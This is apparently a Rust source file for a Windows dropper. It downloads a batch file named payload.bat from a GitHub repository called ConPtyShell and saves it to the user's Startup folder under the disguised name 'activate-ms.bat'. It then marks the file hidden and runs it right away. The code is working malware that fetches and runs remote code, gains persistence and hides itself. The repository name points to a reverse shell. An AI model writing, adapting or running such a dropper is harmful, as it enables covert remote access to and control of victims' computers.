mod error;
mod http_client;

use std::io::Write;
use std::str::FromStr;
use std::{fs::File, process::Command};

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use winapi::um::fileapi::{GetFileAttributesW, SetFileAttributesW};
use winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN;

use anyhow::Result;
use chrono::Local;
use directories::BaseDirs;
use error::Error;
use http::{HeaderMap, Method};
use http_client::{async_http_client, HttpRequest};
use log::LevelFilter;
use url::Url;

fn init_logger(level: &str) {
    let mut log_builder = env_logger::Builder::new();
    log_builder.format(|buf, record| {
        let mut module = "";
        if let Some(path) = record.module_path() {
            if let Some(split) = path.split("::").last() {
                module = split;
            }
        }

        writeln!(
            buf,
            "{}[{}]:{}: {}",
            Local::now().format("[%d-%m-%Y %H:%M:%S]"),
            record.level(),
            module,
            record.args()
        )
    });

    log_builder.filter_level(LevelFilter::from_str(level).unwrap_or(LevelFilter::Info));
    if let Err(e) = log_builder.try_init() {
        log::error!("{:?}", e);
    }
}

#[tokio::main(flavor = "current_thread")]
async fn main() -> Result<()> {
    init_logger("Debug");

    let request = HttpRequest {
        url: Url::parse(
            "https://raw.githubusercontent.com/LorenzoLeonardo/ConPtyShell/master/payload.bat",
        )?,
        method: Method::GET,
        headers: HeaderMap::new(),
        body: Vec::new(),
    };

    let response = async_http_client(request).await?;
    let payload = String::from_utf8(response.body)?;

    // Get the path to the 'shell:startup' folder
    let dirs = BaseDirs::new().ok_or(Error::IO("Directory not found".to_string()))?;
    let startup_path = dirs
        .config_dir()
        .join("Microsoft\\Windows\\Start Menu\\Programs\\Startup");

    // Create the file in the 'shell:startup' folder
    let file_path = startup_path.join("activate-ms.bat");
    let mut file = File::create(file_path.as_path())?;

    // Write the string content to the file
    file.write_all(payload.as_bytes())?;
    file.flush()?;

    // Convert the file path to wide characters (UTF-16)
    let wide_path: Vec<u16> = OsStr::new(&file_path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    // Get the current file attributes
    let attributes = unsafe { GetFileAttributesW(wide_path.as_ptr()) };
    if attributes == 0xFFFFFFFF {
        log::debug!("GetFileAttributesW failed!");
    }

    // Set the "hidden" attribute
    let new_attributes = attributes | FILE_ATTRIBUTE_HIDDEN;

    // Update the file attributes
    let result = unsafe { SetFileAttributesW(wide_path.as_ptr(), new_attributes) };
    if result == 0 {
        log::debug!("SetFileAttributesW failed!");
    }

    let _ = Command::new(file_path.as_os_str()).spawn()?;

    Ok(())
}
